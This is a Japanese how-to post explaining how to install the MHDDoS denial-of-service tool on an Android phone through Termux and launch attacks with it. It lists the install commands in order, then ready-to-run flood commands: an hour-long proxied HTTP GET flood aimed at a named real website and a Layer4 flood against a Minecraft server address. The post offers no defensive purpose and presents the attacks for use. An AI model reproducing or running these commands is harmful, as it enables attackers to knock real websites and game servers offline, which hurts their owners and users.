スマホでMHDDoSを使おう！

MHDDoSってなんぞや？(前置き)

まずDDoS攻撃とは、超絶簡単に言いますと田代砲の上位互換です。DDoSツールには様々な種類がありMiraiやAnonDiscordなどあり様々です。

ここではウクライナIT軍でも使用が推奨されるDDoSツール、MHDDoSのインストール方法から使い方まで解説していこうと思います。

※Androidのみ解説となります。ご了承ください。

下準備

では早速TermuxというLinuxエミュレータをインストールします。下のURLを押すと自動でapkファイルがダウンロードされます。ダウンロードが終わりましたら起動してインストールしてください。

https://f-droid.org/repo/com.termux_118.apk

※Android9以降の方はここからどうぞ

下の画像のようにインストールが終わりましたら開くを選択してアプリを開いてください。

開くとかっこいい画面が出来ます。厨二心が揺さぶられますね。これでTermuxのインストールは完了です！

Pythonとgitをインストール

それでは以下のコマンドを一行ずつ入力してEnterで実行しましょう。

pkg update
pkg install root-repo
pkg install python3 git

下の画像は例です。

MHDDoSのダウンロードとインストール

これも一行ずつ入力して実行してください。

git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS
pip3 install -r requirements.txt

下の画像は例です。

MHDDoSの使い方

以下のコマンドをそのままコピペして使用せずに攻撃先に合わせ書き換えて下さい。あとで、痛い目見ますよ。

Layer7の基本

python3 start.py <種類> <攻撃先URL> <串のタイプ> <スレッド> <串リスト> <継続時間>

下のコマンドは攻撃先URLと継続時間を変えるだけでよろしい。(串リストがない場合は自動的にダウンロードされます)

python3 start.py GET http://prkorea.com 1 200 proxy.txt 100 3600

Layer4の基本

python3 start.py <種類> <スレッド> <存続期間>

Layer4でマイクラサーバを攻撃する場合

python3 start.py MINECRAFT 11.45.1.4:810 2000 3600

詳しい内容はpython3 start.pyを入力して試して下さい。
